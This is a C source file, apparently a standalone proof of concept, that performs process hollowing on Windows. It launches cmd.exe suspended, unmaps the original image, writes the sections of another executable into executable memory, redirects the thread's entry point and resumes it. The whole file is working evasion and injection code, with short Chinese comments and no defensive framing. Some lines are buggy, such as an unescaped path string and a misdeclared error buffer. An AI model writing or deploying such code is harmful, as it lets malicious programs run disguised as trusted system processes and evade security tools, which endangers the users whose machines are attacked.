#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include <Windows.h>



typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);


void Showerror(char *msg) {
	char* err[MAX_PATH] = { 0 };
	sprintf(err, "ERROR:%s", msg);
	MessageBoxA(NULL, err, "Error", MB_OK);
}

int main(int argc, wchar_t* argv[])
{
	IN PIMAGE_DOS_HEADER pDosHeaders;
	IN PIMAGE_NT_HEADERS pNtHeaders;
	IN PIMAGE_SECTION_HEADER pSectionHeaders;

	IN PVOID FileImage;

	IN HANDLE hFile;
	OUT DWORD FileReadSize;
	IN DWORD dwFileSize;

	IN PVOID RemoteImageBase;
	IN PVOID RemoteProcessMemory;




	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	si.cb = sizeof(si);





	char path[] = "C:\\Project1.exe";
	BOOL bRet = CreateProcessA(
		"C:\Windows\System32\cmd.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&si,
		&pi);

	//在本进程获取替换文件的内容
	hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		Showerror("CreateFile");
		return;
	}

	dwFileSize = GetFileSize(hFile, NULL); 
	FileImage = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL);
	CloseHandle(hFile);

	pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
	pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileImage + pDosHeaders->e_lfanew);

	GetThreadContext(pi.hThread, &ctx); 
	ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);

	//判断文件预期加载地址是否被占用
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
	{
		NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); //卸载已存在文件
	}

	//
	RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	//逐段写入
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		pSectionHeaders = (PIMAGE_SECTION_HEADER)((LPBYTE)FileImage + pDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders->VirtualAddress), (PVOID)((LPBYTE)FileImage + pSectionHeaders->PointerToRawData), pSectionHeaders->SizeOfRawData, NULL);
	}


	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);


	SetThreadContext(pi.hThread, &ctx); 
	ResumeThread(pi.hThread);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	
	Sleep(10000000);

	return 0;
}